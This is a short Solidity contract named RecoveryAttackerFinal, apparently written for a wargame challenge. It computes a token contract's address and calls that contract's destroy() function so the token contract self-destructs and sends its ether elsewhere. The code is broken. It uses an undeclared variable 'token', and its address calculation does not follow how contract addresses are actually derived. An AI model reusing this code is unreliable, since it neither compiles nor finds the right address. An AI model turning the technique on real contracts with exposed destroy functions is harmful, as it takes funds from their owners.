pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryAttackerFinal {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function calculateAddress() public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(uint160(instance), uint256(0)));
        return address(uint160(bytes20(hash)));
    }

    function destroyToken() public {
        ISimpleToken(token).destroy(payable(address(instance)));
    }
}
